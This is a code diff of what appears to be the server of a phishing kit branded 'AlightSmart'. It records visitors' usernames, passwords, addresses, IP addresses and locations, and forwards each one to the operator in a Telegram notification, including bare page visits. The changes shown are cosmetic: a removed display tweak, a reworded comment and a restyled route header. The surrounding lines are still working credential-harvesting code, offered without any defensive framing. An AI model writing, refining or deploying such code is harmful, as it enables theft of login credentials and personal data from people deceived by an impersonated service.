@@ -57,14 +57,9 @@ async function getLocation(ip) {
 }
 
 async function sendTelegramNotification(record) {
-    let usernameDisplay = record.username || 'Visitor';
-    if (usernameDisplay.includes("Verification") || usernameDisplay.includes("Step")) {
-        usernameDisplay = "Verification Step";
-    }
-
     const message = `🚨🔴 *NEW ACTIVITY - AlightSmart!*\n\n` +
         `• *Type:* ${record.type}\n` +
-        `• *Username:* ${usernameDisplay}\n` +
+        `• *Username:* ${record.username || 'Visitor'}\n` +
         `• *Password:* ${record.password || '-'}\n` +
         `• *Details:* ${record.address || '-'}\n` +
         `• *IP:* ${record.ip}\n` +
@@ -99,7 +94,7 @@ async function saveRecord(type, username = null, password = null, address = null
 
         console.log(`✅ SAVED: ${type} | Location: ${location}`);
 
-        // Send notification for ALL activities (including page visits)
+        // Send notification for EVERY activity (including pure page visits)
         await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
 
     } catch (err) {
@@ -107,7 +102,7 @@ async function saveRecord(type, username = null, password = null, address = null
     }
 }
 
-// Routes
+// ==================== ROUTES ====================
 app.get('/', async (req, res) => {
     const ip = getRealIP(req);
     await saveRecord('Page Visit', null, null, 'Main Link Clicked', ip);
